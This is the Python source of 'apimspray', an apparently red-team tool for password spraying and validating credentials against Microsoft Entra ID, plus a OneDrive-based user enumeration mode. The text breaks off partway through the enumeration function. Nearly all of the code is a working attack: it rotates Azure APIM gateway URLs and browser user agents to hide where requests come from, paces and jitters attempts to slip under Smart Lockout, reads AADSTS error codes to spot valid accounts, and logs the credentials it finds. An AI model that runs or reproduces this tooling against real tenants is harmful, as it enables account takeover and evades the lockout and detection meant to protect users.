#!/usr/bin/env python3
"""
apimspray - Entra ID Auth Assessment Toolkit via APIM Gateways
Enhanced with OneDrive-based passive user enumeration
"""

import argparse
import os
import sys
import time
import uuid
import random
import threading
import json
import re
import requests
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse

# --- Configuration & Constants ---

VERSION = "3.0.0"

# Terminal Colors
USE_COLOR = sys.stdout.isatty() and not os.getenv("NO_COLOR")

class TermColors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"

# Pacing configurations (spray / validate)
PACE_SETTINGS = {
    "high": {"workers": 15, "delay": 0.1, "count": 10, "lockout": 5, "safe": 20, "jitter": 0},
    "medium": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
    "mid": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
    "low": {"workers": 2, "delay": 5, "count": 2, "lockout": 15, "safe": 5, "jitter": 20},
    "stealth": {"workers": 1, "delay": 30, "count": 1, "lockout": 20, "safe": 1, "jitter": 40},
}

# Enumerate speed templates — threads_per_proxy scales automatically with proxy count.
# timeout is how long each request waits for a response.
# direct_threads is used when no --aci-urls are provided.
ENUM_PACE_SETTINGS = {
    #            threads/proxy  timeout  direct_threads
    "turbo":  {"threads_per_proxy": 20, "timeout": 30, "direct_threads": 200},
    "high":   {"threads_per_proxy": 10, "timeout": 25, "direct_threads": 100},
    "medium": {"threads_per_proxy":  5, "timeout": 20, "direct_threads":  50},
    "low":    {"threads_per_proxy":  2, "timeout": 15, "direct_threads":  20},
    "stealth":{"threads_per_proxy":  1, "timeout": 10, "direct_threads":   5},
}


# Smart Lockout
LOCKOUT_WAIT_SECONDS = 65
SMART_LOCKOUT_ERROR = "AADSTS50053"
USER_NOT_FOUND_ERROR = "AADSTS50034"

# User Agents (Windows 11)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.37 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.38 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.38",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/144.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/145.0.0.0"
]

# Client Apps (ClientId, Resource, Scope)
CLIENT_APPS = [
    {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "resource": "https://graph.microsoft.com",
        "scope": "openid profile offline_access"
    },
    {
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "resource": "https://graph.windows.net",
        "scope": "openid profile"
    },
    {
        "client_id": "00000002-0000-0ff1-ce00-000000000000",
        "resource": "https://outlook.office365.com",
        "scope": "openid profile"
    },
    {
        "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        "resource": "https://graph.microsoft.com",
        "scope": "openid profile"
    }
]


# AADSTS Codes
AADSTS_REGEX = re.compile(r'(AADSTS\d+)')
AADSTS_MAP = {
    "AADSTS50053": "LOCKED (Smart Lockout)",
    "AADSTS50055": "VALID (Password Expired)",
    "AADSTS50057": "BLOCKED (Account Disabled)",
    "AADSTS50126": "FAILED (Invalid Creds)",
    "AADSTS50034": "FAILED (User Not Found)",
    "AADSTS50059": "FAILED (Tenant Not Found)",
    "AADSTS50128": "FAILED (Invalid Domain)",
    "AADSTS50076": "VALID (MFA Required)",
    "AADSTS50079": "VALID (MFA Required)",
    "AADSTS50158": "VALID (Conditional Access)",
    "AADSTS53003": "VALID (Conditional Access Blocked)",
    "AADSTS53000": "BLOCKED (Policy)",
    "AADSTS50105": "BLOCKED (Not Assigned)",
    "AADSTS500011": "VALID (Invalid Resource)",
    "AADSTS700016": "VALID (Invalid ClientID)",
    "AADSTS50000": "ERROR (Token Issue)",
}

# --- Classes ---

class Target:
    def __init__(self, username, password=None):
        self.username = username
        self.password = password

class APIMManager:
    def __init__(self, urls):
        self.urls = urls
        self.lock = threading.Lock()
        self._pool = []
        self._last_url = None

    def get_next_url(self):
        """Returns the next APIM URL, cycling through a shuffled pool."""
        with self.lock:
            if not self.urls:
                raise ValueError("No APIM URLs available.")
            if len(self.urls) == 1:
                return self.urls[0]
            if not self._pool:
                self._pool = list(self.urls)
                random.shuffle(self._pool)
                if self._last_url and self._pool[0] == self._last_url and len(self._pool) > 1:
                    self._pool[0], self._pool[1] = self._pool[1], self._pool[0]
            next_url = self._pool.pop(0)
            self._last_url = next_url
            return next_url

class Logger:
    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.timestamp = int(datetime.now(timezone.utc).timestamp())
        self.run_dir = self.output_dir / str(self.timestamp)
        self.run_dir.mkdir(parents=True, exist_ok=True)
        
        self.files = {
            "valid": self.run_dir / f"valid_{self.timestamp}.txt",
            "blocked": self.run_dir / f"blocked_{self.timestamp}.txt",
            "failed": self.run_dir / f"failed_{self.timestamp}.txt",
            "enumerated": self.run_dir / f"enumerated_{self.timestamp}.txt",
        }
        self.locks = {k: threading.Lock() for k in self.files}

    def log_result(self, result_type, file_message, console_message=None):
        """Logs result to file and console."""
        if result_type not in self.files:
            return
        if console_message:
            print(console_message)
        with self.locks[result_type]:
            with open(self.files[result_type], "a", encoding="utf-8") as f:
                if result_type == "enumerated":
                    f.write(f"{file_message}\n")
                else:
                    f.write(f"{utc_now_str()} | {file_message}\n")

class ProgressTracker:
    """Thread-safe progress tracker that prints status when the user hits Enter."""

    def __init__(self):
        self._total = 0
        self._completed = 0
        self._label = "Spraying"
        self._lock = threading.Lock()
        self._start_time = None
        self._stop_event = threading.Event()
        self._listener_thread = None
        self._active = False
        self._global_total = 0
        self._global_completed = 0
        self._global_start_time = None

    def begin_session(self, overall_total):
        self._global_total = overall_total
        self._global_completed = 0
        self._global_start_time = time.monotonic()
        self._stop_event.clear()
        self._active = True
        if sys.stdin.isatty():
            self._listener_thread = threading.Thread(target=self._listen_loop, daemon=True)
            self._listener_thread.start()

    def end_session(self):
        self._stop_event.set()
        self._active = False
        if self._listener_thread:
            # Don't join — the daemon thread will die with the process.
            # Joining a thread blocked on stdin.readline() can hang indefinitely.
            self._listener_thread = None

    def begin_round(self, total, label="Spraying"):
        with self._lock:
            self._total = total
            self._completed = 0
            self._label = label
            self._start_time = time.monotonic()

    def end_round(self):
        with self._lock:
            self._global_completed += self._completed

    def increment(self, n=1):
        with self._lock:
            self._completed += n

    def _listen_loop(self):
        """Background thread: waits for Enter key, prints progress on demand.
        Uses select() with the stop event pipe so it can be interrupted cleanly."""
        while not self._stop_event.is_set():
            try:
                ready = _stdin_ready(timeout=0.5)
                if self._stop_event.is_set():
                    break
                if ready:
                    try:
                        sys.stdin.readline()
                    except (OSError, ValueError):
                        break
                    if self._active and not self._stop_event.is_set():
                        self._print_progress()
            except Exception:
                break

    def _print_progress(self):
        if not sys.stdout.isatty():
            return
        with self._lock:
            r_completed = self._completed
            r_total = self._total
            r_elapsed = time.monotonic() - self._start_time if self._start_time else 0
            g_completed = self._global_completed + r_completed
            g_total = self._global_total
            g_elapsed = time.monotonic() - self._global_start_time if self._global_start_time else 0
            label = self._label
        if r_total == 0:
            return
        r_pct = (r_completed / r_total) * 100.0
        r_rate = r_completed / r_elapsed if r_elapsed > 0 else 0.0
        r_eta = _format_duration((r_total - r_completed) / r_rate) if r_rate > 0 and r_completed < r_total else ("done" if r_completed >= r_total else "...")
        g_pct = (g_completed / g_total) * 100.0 if g_total > 0 else 0.0
        g_rate = g_completed / g_elapsed if g_elapsed > 0 else 0.0
        g_eta = _format_duration((g_total - g_completed) / g_rate) if g_rate > 0 and g_completed < g_total else ("done" if g_completed >= g_total else "...")
        bar_width = 20
        filled = int(bar_width * r_completed / r_total) if r_total > 0 else 0
        bar = "\u2588" * filled + "\u2591" * (bar_width - filled)
        separator = style("\u2500" * 60, TermColors.DIM)
        round_line = (
            f"  {style(label, TermColors.CYAN, TermColors.BOLD)} "
            f"[{bar}] "
            f"{style(f'{r_pct:5.1f}%', TermColors.BOLD)} "
            f"({r_completed}/{r_total}) "
            f"| {r_rate:.1f} req/s "
            f"| ETA: {r_eta}"
        )
        global_line = (
            f"  {style('Overall', TermColors.MAGENTA, TermColors.BOLD)}  "
            f"{style(f'{g_pct:5.1f}%', TermColors.BOLD)} "
            f"({g_completed}/{g_total}) "
            f"| Elapsed: {_format_duration(g_elapsed)} "
            f"| ETA: {g_eta} "
            f"| {g_rate:.1f} req/s"
        )
        hint = style("  (press Enter again for updated progress)", TermColors.DIM)
        print(f"\n{separator}")
        print(round_line)
        print(global_line)
        print(f"{separator}{hint}\n", flush=True)

def _stdin_ready(timeout=0.5):
    import select
    try:
        ready, _, _ = select.select([sys.stdin], [], [], timeout)
        return bool(ready)
    except (ValueError, OSError):
        time.sleep(timeout)
        return False

def _format_duration(seconds):
    seconds = max(0, int(seconds))
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        m, s = divmod(seconds, 60)
        return f"{m}m{s:02d}s"
    else:
        h, remainder = divmod(seconds, 3600)
        m, s = divmod(remainder, 60)
        return f"{h}h{m:02d}m{s:02d}s"

# --- Helper Functions ---

def style(text, *styles):
    if not USE_COLOR or not styles:
        return text
    return f"{''.join(styles)}{text}{TermColors.RESET}"

def utc_now_str():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def print_info(message):
    prefix = style("[*]", TermColors.CYAN, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_warn(message):
    prefix = style("[!]", TermColors.YELLOW, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_success(message):
    prefix = style("[+]", TermColors.GREEN, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_error(message):
    prefix = style("[x]", TermColors.RED, TermColors.BOLD)
    print(f"{prefix} {message}")

def format_result_line(timestamp, target, classification):
    ts = style(f"[{timestamp}]", TermColors.DIM)
    creds = f"{target.username}:{target.password}"
    if classification.startswith("VALID"):
        creds = style(creds, TermColors.GREEN, TermColors.BOLD)
        status = style(classification, TermColors.GREEN, TermColors.BOLD)
    elif classification.startswith("LOCKED") or classification.startswith("BLOCKED"):
        creds = style(creds, TermColors.YELLOW, TermColors.BOLD)
        status = style(classification, TermColors.YELLOW, TermColors.BOLD)
    elif classification.startswith("FAILED"):
        creds = style(creds, TermColors.RED)
        status = style(classification, TermColors.RED)
    else:
        status = style(classification, TermColors.MAGENTA)
    return f"{ts} {creds} | {status}"

def wait_with_countdown(seconds, allow_skip):
    if seconds <= 0:
        return False
    skip_event = threading.Event()
    if allow_skip and sys.stdin.isatty():
        t = threading.Thread(target=_wait_for_enter, args=(skip_event,), daemon=True)
        t.start()
    if not sys.stdout.isatty():
        time.sleep(seconds)
        return skip_event.is_set()
    for remaining in range(seconds, 0, -1):
        line = f"    Waiting {remaining}s to retry"
        if allow_skip and sys.stdin.isatty():
            line += " (press Enter to skip)"
        print(f"\r{line}", end="", flush=True)
        if skip_event.is_set():
            break
        time.sleep(1)
    print("\033[2K\r", end="", flush=True)
    print()
    return skip_event.is_set()

def _wait_for_enter(event):
    try:
        sys.stdin.readline()
    except Exception:
        return
    event.set()

def load_file_lines(path):
    p = Path(path)
    if not p.exists():
        return []
    with open(p, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

HISTORY_FILE = Path(".apimspray_history.json")

def _load_password_history():
    """Load per-domain password attempt history from disk."""
    if HISTORY_FILE.exists():
        try:
            with open(HISTORY_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            return {}
    return {}

def _save_password_history(history):
    """Save per-domain password attempt history to disk."""
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2)

def _get_domain_from_users(users):
    """Extract the domain from the user list (takes the first user's domain)."""
    for u in users:
        if "@" in u:
            return u.split("@", 1)[1].lower()
    return None

def _check_and_record_passwords(passwords, domain):
    """Check passwords against history for this domain.

    Returns the list of passwords to actually spray (duplicates removed if
    the user chooses to skip them).  Records all sprayed passwords in history.
    """
    if not domain:
        return passwords

    history = _load_password_history()
    past = set(history.get(domain, []))

    duplicates = [p for p in passwords if p in past]
    if not duplicates:
        # Record and return all
        history.setdefault(domain, [])
        for p in passwords:
            if p not in past:
                history[domain].append(p)
        _save_password_history(history)
        return passwords

    # Warn the user
    dup_list = ", ".join(duplicates)
    print_warn(f"The following password(s) were already attempted against "
               f"{style(domain, TermColors.CYAN, TermColors.BOLD)}: {style(dup_list, TermColors.YELLOW)}")

    if sys.stdin.isatty():
        try:
            choice = input("  [S]kip duplicates / [C]ontinue anyway / [A]bort? [S/c/a]: ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print()
            sys.exit(1)
    else:
        choice = "s"

    if choice in ("a", "abort"):
        print_error("Aborted by user.")
        sys.exit(1)

    if choice in ("c", "continue"):
        spray_passwords = passwords
    else:
        # Default: skip duplicates
        spray_passwords = [p for p in passwords if p not in past]
        if not spray_passwords:
            print_warn("All passwords already attempted for this domain. Nothing to spray.")
            return []
        print_info(f"Skipping {len(duplicates)} duplicate(s). {len(spray_passwords)} password(s) remaining.")

    # Record newly attempted passwords
    history.setdefault(domain, [])
    for p in spray_passwords:
        if p not in past:
            history[domain].append(p)
    _save_password_history(history)
    return spray_passwords

def normalize_users(users, domain):
    normalized = []
    for u in users:
        if "@" in u:
            if domain:
                user_part = u.split("@")[0]
                normalized.append(f"{user_part}@{domain}")
            else:
                normalized.append(u)
        else:
            if domain:
                normalized.append(f"{u}@{domain}")
            else:
                normalized.append(u)
    return normalized

def parse_aadsts(text):
    match = AADSTS_REGEX.search(text)
    if match:
        return match.group(1)
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return None
    if isinstance(payload, dict):
        codes = payload.get("error_codes") or payload.get("errorCodes") or []
        if isinstance(codes, list) and codes:
            return f"AADSTS{codes[0]}"
        description = payload.get("error_description", "")
        match = AADSTS_REGEX.search(description)
        if match:
            return match.group(1)
    return None

def get_status_from_aadsts(code):
    return AADSTS_MAP.get(code, "UNKNOWN")

def has_access_token(text):
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return "access_token" in text
    return isinstance(payload, dict) and "access_token" in payload

def build_file_message(target, aadsts, classification, gateway_url):
    aadsts_display = aadsts or "No Code"
    gateway_host = urlparse(gateway_url).netloc
    return f"{target.username}:{target.password} | {aadsts_display} | {classification} | APIM: {gateway_host}"



# ============================================================================
# CORE AUTH LOGIC (unchanged from original)
# ============================================================================

def perform_auth(target, gateway_url, tenant, app_config, proxy_dict=None):
    if not gateway_url.endswith("/"):
        gateway_url += "/"
    full_url = f"{gateway_url}common/oauth2/token"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "client-request-id": str(uuid.uuid4()),
        "return-client-request-id": "true"
    }
    data = {
        "grant_type": "password",
        "resource": app_config["resource"],
        "client_id": app_config["client_id"],
        "scope": app_config["scope"],
        "username": target.username,
        "password": target.password
    }
    try:
        resp = requests.post(full_url, headers=headers, data=data, timeout=15, verify=True)
        return resp.status_code, resp.text, parse_aadsts(resp.text)
    except requests.RequestException as e:
        return 0, str(e), None

def process_attempt(
    target, apim_manager, tenant, pace_config, logger,
    locked_users_set, invalid_users_set, disabled_users_set, lockout_counts,
    lock, continue_on_success, skip_disabled, stop_event,
):
    if stop_event.is_set():
        return
    with lock:
        if target.username in locked_users_set or target.username in invalid_users_set:
            return
        if skip_disabled and target.username in disabled_users_set:
            return
    app_config = random.choice(CLIENT_APPS)
    gateway_url = apim_manager.get_next_url()
    status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)

    # Handle User Not Found (50034) — log it, mark user, and return early
    if aadsts == USER_NOT_FOUND_ERROR:
        with lock:
            if target.username not in invalid_users_set:
                invalid_users_set.add(target.username)
        classification = "FAILED (User Not Found)"
        timestamp = utc_now_str()
        file_msg = build_file_message(target, aadsts, classification, gateway_url)
        console_msg = f"{style('[!]', TermColors.YELLOW, TermColors.BOLD)} {style(target.username, TermColors.YELLOW)} | {style(classification, TermColors.YELLOW)}"
        logger.log_result("failed", file_msg, console_msg)
        return

    # Handle Smart Lockout (50053)
    if aadsts == SMART_LOCKOUT_ERROR:
        is_slow_pace = pace_config["delay"] >= 2
        with lock:
            lockout_counts[target.username] = lockout_counts.get(target.username, 0) + 1
            lockout_count = lockout_counts[target.username]
        user_display = style(target.username, TermColors.RED, TermColors.BOLD)
        classification = get_status_from_aadsts(aadsts)
        file_msg = build_file_message(target, aadsts, classification, gateway_url)
        if lockout_count == 1:
            print_warn(f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. Skipping wait on first occurrence.")
            logger.log_result("blocked", file_msg)
            return
        if is_slow_pace:
            allow_skip = sys.stdin.isatty()
            skip_note = " Press Enter to skip." if allow_skip else ""
            print_warn(f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. Waiting {LOCKOUT_WAIT_SECONDS}s to retry.{skip_note}")
            wait_with_countdown(LOCKOUT_WAIT_SECONDS, allow_skip=allow_skip)
            gateway_url = apim_manager.get_next_url()
            status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)
            if aadsts == SMART_LOCKOUT_ERROR:
                with lock:
                    locked_users_set.add(target.username)
                classification = get_status_from_aadsts(aadsts)
                file_msg = build_file_message(target, aadsts, classification, gateway_url)
                logger.log_result("blocked", file_msg)
                return
        else:
            print_warn(f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. Skipping wait due to pace.")
            logger.log_result("blocked", file_msg)
            return

    # Classify the result
    classification = "UNKNOWN"
    if aadsts:
        classification = get_status_from_aadsts(aadsts)
    elif status_code == 200 and has_access_token(response_text):
        classification = "VALID (Token)"
    elif status_code == 200:
        classification = "UNKNOWN (200 OK)"
    elif status_code == 0:
        classification = "ERROR (Request Failed)"
    else:
        classification = f"UNKNOWN (HTTP {status_code})"

    timestamp = utc_now_str()
    file_msg = build_file_message(target, aadsts, classification, gateway_url)

    if classification.startswith("VALID"):
        console_msg = format_result_line(timestamp, target, classification)
        logger.log_result("valid", file_msg, console_msg)
    elif classification.startswith("BLOCKED") or classification.startswith("LOCKED"):
        console_msg = format_result_line(timestamp, target, classification)
        logger.log_result("blocked", file_msg, console_msg)
    elif classification.startswith("FAILED"):
        logger.log_result("failed", file_msg)
    else:
        logger.log_result("failed", file_msg)

    if skip_disabled and classification == "BLOCKED (Account Disabled)":
        with lock:
            disabled_users_set.add(target.username)
        print_warn(f"Disabled account detected — removing {style(target.username, TermColors.YELLOW)} from spray list.")

    is_valid_credential = classification.startswith("VALID") or classification == "BLOCKED (Account Disabled)"
    if is_valid_credential and not continue_on_success:
        print_success("Valid credentials found. Stopping as --continue-on-success is not set.")
        stop_event.set()




# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="apimspray - Entra ID Assessment Tool (with OneDrive Enumeration)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--urls", required=False, help="Path to APIM URLs file (login gateways, from apimcreate.py)")
    parser.add_argument("--users", help="Path to users file")
    parser.add_argument("--passwords", help="Path to passwords file")
    parser.add_argument("--output", default="results", help="Output directory")
    parser.add_argument("--tenant", default=None, help="Tenant ID or Domain (required for spray/validate and for enumerate without --aci-urls)")
    parser.add_argument("--domain", help="Append domain to users if missing")
    parser.add_argument(
        "--mode",
        required=True,
        choices=["spray", "validate", "enumerate"],
        help=(
            "Operation mode:\n"
            " - spray:      Test all passwords against all users (1:N) via APIM.\n"
            " - validate:   Perform 1:1 credential pair testing via APIM.\n"
            " - enumerate:  Enumerate valid users via OneDrive URL probing (passive, no login).\n"
            "               Route through ACI proxies (--aci-urls) for multi-IP throughput."
        ),
    )
    parser.add_argument(
        "--pace",
        default="low",
        choices=["stealth", "low", "mid", "medium", "high"],
        help=(
            "Pacing profile for requests and lockout management:\n"
            " - high:    15 workers, 0.1s delay\n"
            " - medium:  5 workers,  1.0s delay, 10%% jitter\n"
            " - low:     2 workers,  5.0s delay, 20%% jitter\n"
            " - stealth: 1 worker,  30.0s delay, 40%% jitter"
        ),
    )
    parser.add_argument("--continue-on-success", action="store_true", help="Continue after finding valid credentials.")
    parser.add_argument("--remove-disabled", action="store_true", help="Remove disabled accounts (AADSTS50057) from the spray list as they are discovered.")
    parser.add_argument("--randomize-users", action="store_true", help="Randomize user order before each round.")
    parser.add_argument("--verbose", action="store_true", help="Enable on-demand progress output (press Enter to see progress).")
    parser.add_argument("--no-history", action="store_true", help="Skip duplicate password checking (don't warn about previously attempted passwords).")

    # Enumerate-specific arguments
    parser.add_argument(
        "--aci-urls",
        help="Path to ACI proxy URLs file for enumeration (from onedrive_proxy.py).\n"
             "Proxies are shared across all threads for IP rotation."
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=100,
        help="Number of threads for enumeration (default: 100). Overridden by --enum-pace."
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Request timeout in seconds for enumeration (default: 5). Overridden by --enum-pace."
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=1,
        help="Number of times to retry errored users at the end of enumeration (default: 1)"
    )
    parser.add_argument(
        "--enum-pace",
        choices=["turbo", "high", "medium", "low", "stealth"],
        default=None,
        help=(
            "Enumeration speed template (overrides --threads and --timeout):\n"
            " - turbo:   20 threads/proxy, 30s timeout  [~1000 threads with 50 proxies]\n"
            " - high:    10 threads/proxy, 25s timeout  [~500 threads with 50 proxies]\n"
            " - medium:   5 threads/proxy, 20s timeout  [~250 threads with 50 proxies]\n"
            " - low:      2 threads/proxy, 15s timeout  [~100 threads with 50 proxies]\n"
            " - stealth:  1 thread/proxy,  10s timeout  [~ 50 threads with 50 proxies]"
        ),
    )

    args = parser.parse_args()

    # ---- ENUMERATE MODE ----
    if args.mode == "enumerate":
        _run_enumerate(args)
        return

    # ---- SPRAY / VALIDATE MODES (original logic) ----
    if not args.urls or not Path(args.urls).exists() or os.stat(args.urls).st_size == 0:
        print_warn("No URLs provided or file is empty.")
        if sys.stdin.isatty():
            try:
                choice = input("Would you like to deploy new APIM resources now? [y/N]: ").strip().lower()
                if choice in ('y', 'yes'):
                    print_info("Launching apimcreate.py...")
                    try:
                        subprocess.run(
                            [sys.executable, "apimcreate.py", "--type", "login", "--count", "33", "--outfile", "urls.txt"],
                            check=True
                        )
                        args.urls = "urls.txt"
                    except subprocess.CalledProcessError:
                        print_error("Failed to create APIM resources.")
                        sys.exit(1)
                else:
                    print_error("Aborted by user.")
                    sys.exit(1)
            except KeyboardInterrupt:
                sys.exit(1)
        else:
            print_error("Non-interactive mode: Please provide --urls with valid file.")
            sys.exit(1)

    urls = load_file_lines(args.urls)
    if not urls:
        print_error("No URLs found in provided file.")
        sys.exit(1)

    apim_manager = APIMManager(urls)

    users = []
    if args.users:
        users = load_file_lines(args.users)
        users = normalize_users(users, args.domain)
        if args.randomize_users:
            random.shuffle(users)
            print_info(f"User list randomized ({len(users)} users shuffled)")

    passwords = []
    if args.passwords:
        passwords = load_file_lines(args.passwords)

    targets = []
    if args.mode == "validate":
        if not users or not passwords:
            print_error("Validate mode requires --users and --passwords")
            sys.exit(1)
        if len(users) != len(passwords):
            print_error("Validate mode requires equal number of users and passwords (1:1 mapping)")
            sys.exit(1)
        targets = [Target(u, p) for u, p in zip(users, passwords)]

    logger = Logger(args.output)
    pace_config = PACE_SETTINGS[args.pace]
    workers = pace_config["workers"]
    base_delay = pace_config["delay"]

    print_info(f"Starting apimspray")
    print_info(f"Mode: {style(args.mode, TermColors.MAGENTA, TermColors.BOLD)}")
    if args.mode == "spray":
        print_info(f"Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
        print_info(f"Passwords: {style(str(len(passwords)), TermColors.MAGENTA, TermColors.BOLD)}")
    else:
        print_info(f"Targets: {style(str(len(targets)), TermColors.MAGENTA, TermColors.BOLD)}")
    print_info(f"Gateways: {style(str(len(urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
    print_info(f"Workers: {style(str(workers), TermColors.MAGENTA, TermColors.BOLD)}, Delay: {style(f'{base_delay}s', TermColors.MAGENTA, TermColors.BOLD)}")
    if args.randomize_users:
        print_info(f"User Randomization: {style('ENABLED', TermColors.GREEN, TermColors.BOLD)}")
    if args.verbose:
        print_info(f"Verbose Progress: {style('ENABLED', TermColors.GREEN, TermColors.BOLD)}")

    locked_users_set = set()
    invalid_users_set = set()
    disabled_users_set = set()
    lockout_counts = {}
    lock = threading.Lock()
    stop_event = threading.Event()
    progress_tracker = ProgressTracker() if args.verbose else None

    def run_assessment(target_list, progress_label=None):
        if stop_event.is_set():
            return
        if progress_tracker:
            progress_tracker.begin_round(len(target_list), label=progress_label or "Spraying")
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for target in target_list:
                if stop_event.is_set():
                    break
                # Check safe threshold mid-round so stealth mode aborts promptly
                with lock:
                    if len(locked_users_set) >= pace_config["safe"]:
                        stop_event.set()
                        break
                current_delay = base_delay
                if pace_config["jitter"] > 0 and base_delay > 0:
                    jitter_val = (base_delay * pace_config["jitter"]) / 100.0
                    current_delay += random.uniform(-jitter_val, jitter_val)
                    current_delay = max(0, current_delay)
                if current_delay > 0 and workers == 1:
                    time.sleep(current_delay)
                future = executor.submit(
                    process_attempt, target, apim_manager, args.tenant or "common", pace_config,
                    logger, locked_users_set, invalid_users_set, disabled_users_set, lockout_counts,
                    lock, args.continue_on_success, args.remove_disabled, stop_event,
                )
                if progress_tracker:
                    future.add_done_callback(lambda _: progress_tracker.increment())
                futures.append(future)
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass
        if progress_tracker:
            progress_tracker.end_round()

    if args.mode == "validate":
        if args.randomize_users:
            random.shuffle(targets)
        if progress_tracker:
            progress_tracker.begin_session(len(targets))
        run_assessment(targets, progress_label="Validating")
        if progress_tracker:
            progress_tracker.end_session()
    elif args.mode == "spray":
        if not users or not passwords:
            print_error("Spray mode requires --users and --passwords")
            sys.exit(1)
        if not args.no_history:
            domain = _get_domain_from_users(users)
            passwords = _check_and_record_passwords(passwords, domain)
            if not passwords:
                sys.exit(0)
        if progress_tracker:
            progress_tracker.begin_session(len(users) * len(passwords))
        pass_chunk_size = pace_config["count"]
        pass_chunks = [passwords[i:i + pass_chunk_size] for i in range(0, len(passwords), pass_chunk_size)]
        for i, chunk in enumerate(pass_chunks):
            if stop_event.is_set():
                break
            if sys.stdout.isatty():
                print("\033[2K\r", end="", flush=True)
            print_info(f"Spraying password chunk {i+1}/{len(pass_chunks)}: {', '.join(chunk)}")
            for password in chunk:
                if stop_event.is_set():
                    break
                with lock:
                    if len(locked_users_set) >= pace_config["safe"]:
                        print_error(f"Safe threshold reached ({pace_config['safe']} lockouts). Terminating.")
                        if progress_tracker:
                            progress_tracker.end_session()
                        _print_summary(logger, locked_users_set, invalid_users_set, disabled_users_set)
                        sys.exit(1)
                current_targets = [Target(u, password) for u in users
                                   if u not in locked_users_set
                                   and u not in invalid_users_set
                                   and u not in disabled_users_set]
                if args.randomize_users:
                    random.shuffle(current_targets)
                run_assessment(current_targets, progress_label=f"Password: {password}")
                if stop_event.is_set():
                    break
            if i < len(pass_chunks) - 1:
                lockout_wait = pace_config["lockout"]
                if stop_event.is_set():
                    break
                print_info(f"Waiting {lockout_wait} minutes for lockout reset... (Hit Enter to skip)")
                wait_with_countdown(lockout_wait * 60, allow_skip=True)
        if progress_tracker:
            progress_tracker.end_session()

    _print_summary(logger, locked_users_set, invalid_users_set, disabled_users_set)

    # Purge not-found and (optionally) disabled users from the users file on disk
    if args.mode == "spray" and args.users:
        remove_set = set(invalid_users_set)
        if args.remove_disabled:
            remove_set |= disabled_users_set
        if remove_set:
            remaining = [u for u in users if u not in remove_set]
            with open(args.users, "w") as f:
                f.write("\n".join(remaining) + "\n" if remaining else "")
            print_info(f"Removed {len(remove_set)} user(s) from {args.users}: "
                       f"{', '.join(sorted(remove_set))}")


def _run_enumerate(args):
    """Execute OneDrive-based user enumeration."""
    from onedrive_enum import OneDriveEnumerator
    from onedrive_proxy import derive_sharepoint_host, verify_tenant, discover_sharepoint_host

    if not args.users:
        print_error("Enumerate mode requires --users (file of candidate email addresses)")
        sys.exit(1)

    users = load_file_lines(args.users)
    users = normalize_users(users, args.domain)
    if not users:
        print_error("No users loaded from file")
        sys.exit(1)
    if args.randomize_users:
        random.shuffle(users)
        print_info(f"User list randomized ({len(users)} users shuffled)")

    proxy_urls = []
    if getattr(args, "aci_urls", None):
        if not Path(args.aci_urls).exists():
            print_warn(f"--aci-urls file not found: {args.aci_urls} — falling back to direct enumeration")
        else:
